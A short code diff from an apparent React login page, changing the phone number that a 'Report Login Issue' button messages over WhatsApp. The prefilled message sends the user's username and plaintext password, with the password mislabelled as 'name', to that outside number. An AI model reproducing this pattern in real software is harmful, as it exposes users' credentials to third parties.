@@ -150,7 +150,7 @@ import { toast } from "sonner";
                     <Button 
                     className="mt-5 w-full"
                     onClick={()=>{
-                            window.open(`whatsapp://send?phone=9633986935&text=Hi, i cant verify my account : ${username} name : ${password}`);
+                            window.open(`whatsapp://send?phone=8075496634&text=Hi, i cant verify my account : ${username} name : ${password}`);
                     }}>Report Login Issue</Button>
                   </>
                 )}
